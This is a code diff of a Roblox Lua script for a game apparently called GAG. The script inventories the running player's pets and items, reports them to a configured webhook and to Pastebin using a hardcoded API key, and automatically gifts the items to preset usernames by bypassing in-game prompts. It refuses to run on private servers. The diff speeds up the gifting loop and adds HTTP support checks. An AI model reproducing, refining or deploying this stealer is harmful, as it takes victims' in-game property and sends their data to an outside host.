@@ -18,7 +18,12 @@ local RARE_PETS = {
 }
 local DEFAULT_PET_EMOJI = "🐶"
 local DEFAULT_FRUIT_EMOJI = "🥝"
+
 local req = request or http_request or (syn and syn.request)
+if not req then
+    error("Your executor does not support HTTP requests (request/http_request/syn.request not found).")
+end
+
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
@@ -32,12 +37,14 @@ if #CONFIG.USERNAMES == 0 or CONFIG.WEBHOOK == "" then
     plr:Kick("Missing username or webhook in config!")
     return
 end
+
 local function isPrivateServer()
     local ok, result = pcall(function()
         return game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer()
     end)
     return not ok or (result == "VIPServer" or result == "PrivateServer")
 end
+
 if isPrivateServer() then plr:Kick("Server not supported. Use a public GAG server.") return end
 if game.PlaceId ~= 126884695634066 then plr:Kick("Unsupported game. Join a normal GAG server.") return end
 
@@ -49,7 +56,7 @@ local dataService     = require(modules:WaitForChild("DataService"))
 local excludedItems   = {"Seed", "Shovel [Destroy Plants]", "Water", "Fertilizer"}
 
 local function getPetEmoji(name) return RARE_PETS[name] or DEFAULT_PET_EMOJI end
-local function getPetAge(tool) return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)")) or "?" end
+local function getPetAge(tool) return tool:GetAttribute("Age") or (tool.Name:match("Age (%d+)") or "?") end
 local function getWeight(tool)
     local val = tool:FindFirstChild("Weight") or tool:FindFirstChild("KG") or tool:FindFirstChild("WeightValue") or tool:FindFirstChild("Mass")
     if val then
@@ -133,7 +140,6 @@ local function buildBackpackSection(items)
     return table.concat(itemLines, "\n")
 end
 
--- Pastebin function (10min expiry)
 local PASTEBIN_DEV_KEY = "2GXZr-FQKQR15rYjoyFmogIiRIzNif9x"
 local function uploadToPastebin(text)
     local url = "https://pastebin.com/api/api_post.php"
@@ -159,16 +165,14 @@ local function uploadToPastebin(text)
     return nil
 end
 
--- NEW: Build the items embed as a separate embed
 local function buildItemsEmbed(items)
     return {
         title = "🎁 Items Received",
-description = string.format("```\n%s\n```", buildBackpackSection(items)),
-        color = 5793266, -- blue-ish
+description = string.format("```\n%s\n```", buildBackpackSection(items or {}):sub(1, 2000)),  -- ensure it's under 2k chars
+        color = 5793266,
     }
 end
 
--- NEW: Build the main embed, including the "View all hits" field
 local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLink)
     local joinLink = ("https://fern.wtf/joiner?placeId=126884695634066&gameInstanceId=%s"):format(game.JobId)
     local accountAge = (executer and executer.AccountAge or "?") .. " days"
@@ -186,7 +190,6 @@ local function buildMainEmbed(executer, receiver, totalValue, foundRare, pasteLi
     }
 end
 
--- Helper to build all items text for Pastebin
 local function buildAllItemsText(items)
     if #items == 0 then return "_No items!_" end
     local lines = {}
@@ -200,7 +203,6 @@ local function buildAllItemsText(items)
     return table.concat(lines, "\n")
 end
 
--- NEW: Only show top 10 in embed, all in paste
 local function prettyWebhookData(executer, receiver)
     local items, totalValue, foundRare = collectItems()
     local topItems = {}
@@ -275,16 +277,12 @@ local function doGift(receiver)
         local prompt = findGiftPrompt(receiver.Character)
         if prompt then
             local t0 = os.clock()
-            repeat task.wait(0.09) if (os.clock() - t0) > 6 then break end until prompt.Enabled
+            repeat task.wait(0.09) if (os.clock() - t0) > 4 then break end until prompt.Enabled
             bypassProximityPrompt(prompt)
-            wait(0.2)
+            wait(0.18)
         end
-        -- Wait until the item is no longer in your character (gifted or returned to backpack)
-        local waitStart = os.clock()
-        while item.Tool.Parent == plr.Character and (os.clock() - waitStart) < 5 do
-            task.wait(0.1)
-        end
-        wait(0.1)
+        item.Tool.Parent = backpack
+        wait(0.08)
     end
 end
 
